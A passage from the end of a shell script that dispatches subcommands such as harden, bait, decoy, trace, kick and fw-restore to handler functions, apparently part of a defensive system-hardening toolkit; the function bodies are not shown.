        trace) shift; do_trace "$1" ;;
        bait) shift; do_bait "$1" ;;
        sos) do_sos ;;
        why) shift; do_why "$*" ;;
        harden) do_harden ;;
        undo-harden) do_undo_harden ;;
        bugs) do_bugs ;;
        domain) do_domain ;;
        ad) do_ad ;;
        kick) shift; do_kick "$1" ;;
        restore) shift; do_restore "$1" ;;
        findpass) do_findpass ;;
        facts) shift; do_facts "$1" ;;
        trip) shift; do_trip "$1" ;;
        protect) shift; do_protect "$@" ;;
        unprotect) shift; do_unprotect "$@" ;;
        reminders) do_reminders ;;
        scout) do_scout ;;
        plumbing) do_plumbing ;;
        decoy) shift; do_decoy "$1" "$2" ;;
        lock-svc) shift; do_locksvc "$1" "$2" ;;
        undo-lock-svc) shift; do_unlocksvc "$1" ;;
        scrub) do_scrub ;;
        fw-restore) do_fwrestore ;;
        report) do_report ;;
        menu|'') if [ -t 0 ]; then do_menu; else usage; exit 1; fi ;;
        *) usage; exit 1 ;;
    esac
}

main "$@" | sanitize
